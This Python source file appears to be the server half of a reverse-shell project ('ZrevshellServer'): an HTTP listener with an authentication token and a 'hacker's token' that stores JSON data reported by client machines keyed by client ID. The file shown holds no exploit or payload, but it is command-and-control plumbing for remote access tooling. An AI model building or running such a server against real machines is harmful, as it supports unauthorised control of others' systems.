from http.server import HTTPServer, BaseHTTPRequestHandler
from http import HTTPStatus
from functools import partial
from datetime import datetime
from pathlib import Path
from reverse_shell import __version__, __app_name__
from reverse_shell.server import ErrorCodes
import argparse
import reverse_shell.utils as ut
import json
import uuid
import base64
import sys


class ZrevshellServer(BaseHTTPRequestHandler):
    def __init__(self, auth_token: str, hacker_token: str, base_dir: Path,  *args, **kwargs):
        # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.
        self.auth_token = auth_token
        self.hacker_token = hacker_token
        self.base_dir = base_dir

        # Create the base directory if it doesn't exist.
        self.base_dir.mkdir(parents=True, exist_ok=True)

        super().__init__(*args, **kwargs)

    def is_authenticated(self):
        if self.headers.get("Authorization") == f"Basic {self.auth_token}":
            return True
        else:
            self.send_error(HTTPStatus.UNAUTHORIZED)
            return False

    def do_GET(self):
        if self.is_authenticated():
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "text/html")
            if length := self.headers.get("content-length"):
                content = self.rfile.read(length)
                print(content)
            self.end_headers()

            self.wfile.write(bytes("<html><head><title>We are running a server</title></head> <body> <h1> Hello World </h1> </body></html>", "utf-8"))

    def do_PUT(self):
        if self.is_authenticated():
            if self.headers.get("content-type") == "application/json":
                if self.path != "/":
                    file_path = self.base_dir / f"{self.path[1:]}.json"
                else:
                    self.send_error(HTTPStatus.BAD_REQUEST)
                    self.end_headers()
                    return

                data = ut.read_json(file_path)
                client_id = self.headers.get("client-id")
                content_size = int(self.headers.get("content-length"))
                # Create or modify the data
                data[client_id] = json.loads(self.rfile.read(content_size))

                # Write the data back to the file
                ut.write_json(file_path, data)

                # If the data exists then send the 200 status code but if it doesn't exist
                # then send the 201 status code
                if client_id in data:
                    self.send_response(HTTPStatus.OK)
                    self.end_headers()
                else:
                    self.send_response(HTTPStatus.CREATED)
                    self.end_headers()
            else:
                self.send_error(HTTPStatus.UNSUPPORTED_MEDIA_TYPE)
                self.end_headers()


def generate_token():
    random_uuid = uuid.uuid4()
    random_encoded_bytes = str(random_uuid).encode('ascii')
    base64_encoded_bytes = base64.b64encode(random_encoded_bytes)
    return base64_encoded_bytes.decode('ascii')


def create_log_file(auth_token, hacker_token, base_dir: Path):
    current_time = str(datetime.now())
    current_time = current_time.replace(":", "-")
    current_time = current_time.replace(" ", "-")
    current_time = current_time.split(".")[0]

    # Create the path and stuff
    log_dir = base_dir / Path("./logs")
    log_dir.mkdir(parents=True, exist_ok=True)

    file_path = log_dir / f"{current_time}.json"

    with file_path.open("w") as log_file:
        data = {"auth_token": auth_token, "hacker_token": hacker_token}
        log_file.write(json.dumps(data))


def get_config():
    parser = argparse.ArgumentParser(prog=f"{__app_name__} server",
                                     description=f"The server for the {__app_name__} project", formatter_class=argparse.ArgumentDefaultsHelpFormatter
                                     )

    parser.add_argument("--from-log", type=Path, required=False, help="Server generated log file used to re-initiate the same session as the previous.", default=None)

    parser.add_argument("--server-dir", "-sd", type=Path, required=False, help="Directory where the server will store it's data like logs and etc...", default=Path("server_data"))

    parser.add_argument("-p", "--port", type=int, required=False, help="The port on which the server runs on.", default=80)

    parser.add_argument("-i", "--ip", type=str, required=False, help="The ip where the server is hosted on.", default="0.0.0.0")

    parser.add_argument("--version", "-v", action="version", version=f"{__app_name__} server v{__version__}")

    return parser.parse_args()


def initialize_server(auth_token: str, hacker_token: str, host: str, port: int, base_dir: Path, should_create_log_file=True):
    # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.

    # Create a log file with the hacker and auth token
    if should_create_log_file:
        create_log_file(auth_token, hacker_token, base_dir)

    handler = partial(ZrevshellServer, auth_token, hacker_token, base_dir)

    ut.log("info", f"Server is running on {host} port {port}...")
    server = HTTPServer((host, port), handler)
    ut.log("info", f"Generated authentication token -> {auth_token}")
    ut.log("info", f"Generated hacker's token -> {hacker_token}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    print("Server has shutdown.")


def main():
    config = get_config()
    # Extract the auth_token and hacker_token from file
    # if the file exists else generate them
    if (file_path := config.from_log) is not None:
        if not file_path.is_file():
            ut.log("error", f"The file `{file_path}` doesn't exist!")
            sys.exit(ErrorCodes.file_not_found)

        contents = file_path.read_text("utf-8")
        try:
            data = json.loads(contents)
            auth_token = data["auth_token"]
            hacker_token = data["hacker_token"]
        except json.JSONDecodeError:
            ut.log("error", f"File is not valid, Please use a valid server generated file.")
            sys.exit(ErrorCodes.incorrect_file_format)
        should_create_log_file = False

    else:
        auth_token = generate_token()
        hacker_token = generate_token()
        should_create_log_file = True

    initialize_server(auth_token, hacker_token, config.ip, config.port, config.server_dir, should_create_log_file=should_create_log_file)


if __name__ == "__main__":
    main()
